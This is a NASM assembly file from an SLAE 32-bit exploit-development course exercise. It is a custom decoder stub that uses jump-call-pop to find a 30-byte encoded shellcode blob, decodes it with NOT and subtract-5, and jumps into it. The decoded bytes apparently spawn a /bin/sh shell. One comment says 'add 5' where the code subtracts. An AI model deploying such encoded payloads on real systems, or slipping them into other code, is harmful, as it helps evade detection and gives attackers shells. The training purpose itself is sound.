; Filename: assignment_04.nasm
; Author:  Ignacio Lahoz
; Website:  https://medium.com/@nlahoz/slae-assignment-4-5c1c4440ade0
;
;
; Purpose: Assigment 04 - Custom Decoder - SLAE 32 bits course

global _start

section .text
_start:

	jmp short call_shellcode	; 1 - JUMP-CALL-POP technique to store the shellcode to be decoded in the stack

decoder:

	pop esi				; 3 - after the jump we recover the contents of "shellcode" and place them in ESI
	xor ecx, ecx			; zero ecx
	mov cl, 30			; move the length of shellcode for the iteration when decoding
decode:

	not byte [esi]			; First we complement (NOT)
	sub byte [esi], 0x05		; Second we add 5 as we substract that amount when encoding
	;dec byte [esi]
	;inc byte [esi]
	inc esi				; ESI in incremented to continue with the next item to decode
	loop decode			; Iteration
	jmp short shellcode		; Continue iteration until we reach the length of the shellcode


call_shellcode:				; 2 - We jump here and the first instruction is to call decoder, this means that the instruction
					; after the call will be stored in the stack

	call decoder
	shellcode: db 0xc9,0x3a,0xaa,0x92,0x98,0x99,0x87,0x92,0x92,0x98,0x91,0x8c,0xcb,0x92,0xcb,0xcb,0xcb,0xcb,0x71,0x17,0xaa,0x71,0x18,0xa7,0x71,0x19,0x4a,0xef,0x2d,0x7a
